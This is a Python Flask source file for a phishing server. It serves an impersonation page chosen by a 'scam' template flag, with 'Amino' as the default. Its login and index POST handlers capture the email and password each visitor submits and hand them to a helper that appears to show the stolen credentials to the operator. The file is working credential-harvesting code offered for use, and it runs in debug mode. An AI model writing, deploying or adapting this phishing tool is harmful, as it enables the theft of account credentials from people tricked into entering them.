from flask import Flask, render_template, request
from scripts import props
import click
import subprocess

# The server class has been created; otherwise, when passing the template, 
# it only loads the initial value None, which gives the problem that it doesn't take the flag.
# In this way, we pass when initializing the object, the value of the flag, which forces 
# us to take the name of the template and thus define the html path.
class Server:

    template = None # Name of the te    mplate to be displayed
    app = Flask(__name__) # Initialize flask project

    # default constructor:
    # Global is used instead of self because in the paths there 
    # can be no parameter that does not come by url, giving a conflict when trying to use self.
    def __init__(self, scam):
        global template 
        template = scam

    # *************  GET METHODS  *************

    @app.route('/', methods=['GET'])
    def index():
        global template
        return  render_template(f"{template}/index.html")

    @app.route('/login', methods=['GET'])
    def login():
        global template
        return  render_template(f"{template}/login.html")

    # *************  POST METHODS  *************

    @app.route('/', methods=['POST'])
    def get_index():
        global template
        email = request.form['email']
        password = request.form['password']

        props.show_data(email, password)

        return render_template(f"{template}/index.html")

    @app.route('/login', methods=['POST'])
    def get_login():
        global template
        email = request.form['email']
        password = request.form['password']

        props.show_data(email, password)

        return render_template(f"{template}/index.html")

@click.command() # Initialize flag values
@click.option("--template",  '-t', default="Amino")
@click.option("--port",  '-p', default="5000"  )
def main(template, port):
    Server(template).app.run(debug=True, port=port)

if __name__ == '__main__':
    main()